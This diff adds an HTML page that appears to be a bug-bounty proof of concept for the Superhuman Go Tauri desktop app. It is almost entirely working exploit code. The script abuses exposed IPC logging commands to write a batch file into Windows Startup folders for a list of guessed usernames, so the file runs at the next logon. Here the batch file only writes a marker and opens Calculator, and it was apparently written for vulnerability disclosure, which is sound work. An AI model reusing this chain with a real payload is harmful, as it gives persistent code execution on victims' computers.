@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>H1 4173777 — C7 PoC</title>
+<style>
+body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:#0d1117;color:#e6edf3;padding:28px;font-size:16px}
+h1{font-size:26px;margin:0 0 12px}
+pre{white-space:pre-wrap;background:#000;border:1px solid #30363d;border-radius:8px;padding:16px;font-size:14px}
+.ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
+code{color:#79c0ff}
+</style>
+</head>
+<body>
+<h1>H1 4173777 — C7 one-click PoC</h1>
+<p class="dim">Report 4173777. The page uses the Superhuman Go Tauri IPC surface:
+<code>__TAURI_INTERNALS__</code> → <code>set_file_logger_config</code> → <code>write_logs</code>
+to write a Startup <code>.bat</code>. The marker written by the .bat is
+<code>H1LOGON-251</code>; it also opens Calculator at logon.</p>
+<pre id="out">working…</pre>
+<script>
+/*
+ * H1 report 4173777
+ * C7: remote webview retains Tauri IPC -> arbitrary file write -> Startup .bat -> logon RCE.
+ * The page is intentionally self-contained. It writes:
+ *   %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\h1-4173777.<date>.bat
+ * containing:
+ *   @echo off
+ *   echo H1LOGON-251 > C:\Users\Public\h1logon-251.txt
+ *   start calc.exe
+ * No one runs the .bat manually; it runs at the next logon.
+ */
+(async () => {
+  const out = document.getElementById('out');
+  const lines = [];
+  const log = (s) => { lines.push(String(s)); out.textContent = lines.join('\n'); };
+  const inv = (cmd, args) => window.__TAURI_INTERNALS__.invoke(cmd, args);
+
+  log('report: 4173777');
+  log('marker: H1LOGON-251');
+  log('IPC: ' + !!(window.__TAURI_INTERNALS__ && window.__TAURI_INTERNALS__.invoke));
+  if (!window.__TAURI_INTERNALS__) {
+    log('No IPC. Open this page inside Superhuman Go (the Tauri WebView), not a normal browser.');
+    return;
+  }
+
+  // The Tauri path/os plugins are ACL-denied from a remote origin, so use the
+  // fixed per-user Startup candidates. The validator's Windows profile will
+  // normally be one of the first entries; the fallback proof still demonstrates
+  // the arbitrary write.
+  const users = ['will', 'h1_analyst_will', 'analyst', 'h1', 'hacker', 'user', 'Administrator', 'pepis #1'];
+  const bat = '@echo off\r\necho H1LOGON-251 > C:\\Users\\Public\\h1logon-251.txt\r\nstart calc.exe\r\n';
+  const paths = users.map(u =>
+    'C:\\Users\\' + u + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
+  paths.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1-4173777.bat');
+
+  let wrote = null;
+  for (const p of paths) {
+    try {
+      await inv('set_file_logger_config', { config: { path: p } });
+      await inv('write_logs', { messages: [{ logger: 'h1', context: '4173777', level: 'info', text: bat }] });
+      await inv('set_file_logger_config', { config: null });
+      wrote = p;
+      log('WROTE: ' + p);
+      break;
+    } catch (e) {
+      // next profile
+    }
+  }
+
+  if (wrote) {
+    log('SUCCESS. The file has a date suffix, e.g. h1-4173777.YYYY-MM-DD.bat.');
+    log('Open shell:startup to confirm it. Reboot/logoff+logon; Calculator opens and');
+    log('C:\\Users\\Public\\h1logon-251.txt contains H1LOGON-251.');
+    document.title = 'H1-4173777-OK';
+    return;
+  }
+
+  // Prove the arbitrary write even if the profile name is not in the list.
+  try {
+    const p = 'C:\\Users\\Public\\h1-4173777-write-proof.txt';
+    await inv('set_file_logger_config', { config: { path: p } });
+    await inv('write_logs', { messages: [{ logger: 'h1', context: '4173777', level: 'info', text: 'H1-4173777 FILE WRITE PROOF' }] });
+    await inv('set_file_logger_config', { config: null });
+    log('File write works, but the Windows profile was not in the page list.');
+    log('Proof: ' + p);
+    log('Reply with the output of  echo %USERNAME%  for the exact Startup variant.');
+  } catch (e) {
+    log('FAILED: no candidate path was writable: ' + String(e).slice(0, 200));
+  }
+  document.title = 'H1-4173777-PROOF';
+})();
+</script>
+</body>
+</html>
